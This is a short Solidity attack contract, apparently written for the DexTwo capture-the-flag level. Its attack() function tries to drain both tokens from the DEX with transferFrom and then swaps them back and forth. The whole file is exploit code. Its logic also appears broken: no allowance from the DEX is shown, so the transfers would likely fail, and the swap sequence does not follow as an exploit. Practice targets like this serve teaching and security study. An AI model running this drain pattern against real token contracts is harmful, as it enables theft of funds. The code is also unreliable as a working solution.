pragma solidity ^0.8.0;
import "../levels/DexTwo.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
contract DEXAttackerV2 {
    DexTwo public immutable dex;

    constructor(address _dex) {
        dex = DexTwo(_dex);
    }

    function attack() external {
        address token1 = dex.token1();
        address token2 = dex.token2();

        // Take all tokens from DexTwo
        IERC20(token1).transferFrom(address(dex), address(this), IERC20(token1).balanceOf(address(dex)));
        IERC20(token2).transferFrom(address(dex), address(this), IERC20(token2).balanceOf(address(dex)));

        // First swap: token1 to token2
        IERC20(token1).approve(address(dex), type(uint256).max);
        uint256 token1Balance = IERC20(token1).balanceOf(address(this));
        dex.swap(token1, token2, token1Balance);

        // Second swap: token2 to token1
        uint256 token2Balance = IERC20(token2).balanceOf(address(this));
        dex.swap(token2, token1, token2Balance);
    }
}
